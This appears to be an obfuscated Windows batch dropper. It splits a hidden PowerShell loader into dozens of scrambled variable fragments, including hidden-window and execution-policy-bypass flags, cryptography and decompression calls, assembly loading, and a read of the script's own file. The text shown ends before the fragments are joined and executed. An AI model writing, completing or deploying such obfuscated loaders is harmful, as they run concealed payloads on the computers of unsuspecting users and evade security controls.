@echo off
set "efmgLUoGdY=rs"
set "QcuwOATULZ=do"
set "wQJyGkFmnf= C"
set "kJmXtUObhT=.e"
set "NOBEeMGtfy=we"
set "CHgdEQmAhK=py"
set "KikdNdbkAU=y "
set "wksPzmcnGb=ws"
set "ZbhTNoRdER=po"
set "FIihtltGsN=\v"
set "ULiFbsJxox=:\"
set "aLtCevzexy=0\"
set "wobSYMDDAD=1."
set "gPlKGFBrsT=s\"
set "HiVJhIPRFt=rS"
set "wbeVHRzBbl=ow"
set "nFMEacMtKo=st"
set "tNLRTbFBbV=32"
set "QvwDUMbyLh=Sy"
set "LOCrTcosbB=co"
set "PbQTYBcHJD=\W"
set "ShHeFYoRZx=in"
set "liJKUUeeKJ=nd"
set "eRprfMtjQK=Wi"
set "YcLiEEgDLS= /"
set "tmIQmIINKM=ll"
set "WakYdBMUaC=he"
set "igCmgfkQSz=we"
set "VAYJvTjgvZ=ll"
set "ZlZGfUXIyM=xe"
set "nShEDwWZdo=em"
set "MoiUOugifK=he"
set "topzvlgHlU=Po"
set "lfrZryUmWV= %~dp0"
set "tdBjhyHzLa=cd"
set "hjwSLWekVC=fkbQ"
set "FugrbXagCh=Stre"
set "XCjIuOboMs=ND.T"
set "aSHiudhBBO=;$xI"
set "eAthbVDBTR=ion."
set "cFzJPzVMQu=em.C"
set "sHpQXFcyAx=CCDV"
set "tdfppLqlRW=ay()"
set "cEzCkAWvEr=();$"
set "NAcnTIYoGR=ptog"
set "chIzLTmZnE=ment"
set "DfTPjdZklO=  $T"
set "WXVoawHiQp=Obje"
set "xmvRQtfikj=;$JR"
set "UlBDFRafhD=iDha"
set "TaDpvZaZXS=m.Re"
set "ksfMcajEdH=$caH"
set "QZROBSQlLD=comm"
set "gpJyOuyxKy=('%~f0'"
set "sHIkxFEBKX=D) {"
set "AbdjzVfsRg=tryP"
set "edeMhdJXHe=ddin"
set "dsUhyRlmcE=('%*'"
set "pWQXocIbgd=.Cop"
set "DyEFZYSYIT=rans"
set "hBBQnFdNhv= = ["
set "kuNNoIJjdU=$FiD"
set "oXFMDyyYqQ=..-1"
set "uxlqvreiyK=hz);"
set "tdpoxbVhcQ=ose("
set "MNDDkUybOp=bypa"
set "zhBigLGWtq=OyzA"
set "dbjzglbGdx=urit"
set "ykHijARNYV=]::N"
set "VtzBycmHDG=Comp"
set "AkjOxXMHNA=ewLi"
set "WPQeHGljhy=ing("
set "aVSfBZciZF=m.IO"
set "ilwfxMWVTg=ress"
set "nILUIRWKKn=v4Ir"
set "NnXLGvcdJm=rt]:"
set "oUgMMyazKA=);$t"
set "sInCbtzarO=em.I"
set "XQJiuSMbAN=brea"
set "qLJjERdays=jrTI"
set "xmvojXYHFZ=);$F"
set "QTaQleUglB=stem"
set "tfdcATeoJp=::De"
set "lYMqquvrYg=DVM."
set "ncApJByQSr=raph"
set "cwVZNAqTaW=ct S"
set "oZxgbqSOqz=.Ass"
set "ecBwvIFany=stem"
set "NQjAAXKLLj=Disp"
set "noQopJxywt=ddin"
set "QgbnJdNHbp=;$uz"
set "xUuOjSpFLW== $F"
set "FEsJyTImnk= '')"
set "YmLUKSNoIB===')"
set "TNsayYyyjJ=)))"
set "zrmqWFBNxH='[-1"
set "CnabeMggwI=V = "
set "OERdaIkvqJ=null"
set "wScDBcMWay=saBm"
set "IQrGTWtMJC=Conv"
set "bWdXPmwCce=;$CC"
set "FqBjwCiOjX=y.Cr"
set "gxcUYEOzxK=Ruq."
set "oBhvHdKXAO=esaB"
set "bwsFFfyXaM=k; }"
set "gnpooGIXQL=oint"
set "PUmCHfqpWu=caHH"
set "NVEnNGsZSi=ha.I"
set "yaLnbTwJKf=oryS"
set "bAvLKNjUgX= if "
set "dmqkLtzJYj= [Sy"
set "yGuerXqAVw=pher"
set "eXQLBhHmyf=$gmO"
set "LDVYfzwADZ=aHHd"
set "jbysniBCGR=stem"
set "VsmUAaOwfl=UGTu"
